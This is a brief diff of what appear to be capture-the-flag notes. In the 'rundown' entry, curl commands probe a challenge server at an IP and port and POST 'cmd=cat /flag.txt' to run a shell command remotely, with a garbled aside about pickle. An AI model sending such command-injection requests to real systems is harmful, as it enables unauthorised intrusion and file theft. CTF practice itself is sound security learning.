@@ -9,7 +9,7 @@
 
 -3.rundown     curl -X OPTIONS http://35.246.139.54:30595 -i         http://35.246.139.54:30595/console             curl -X POST http://35.246.139.54:30595 -d "cmd=cat /flag.txt" (ase vipovit rom pickle a)
 
-4. online-encryption
+-4. online-encryption
 
 
 
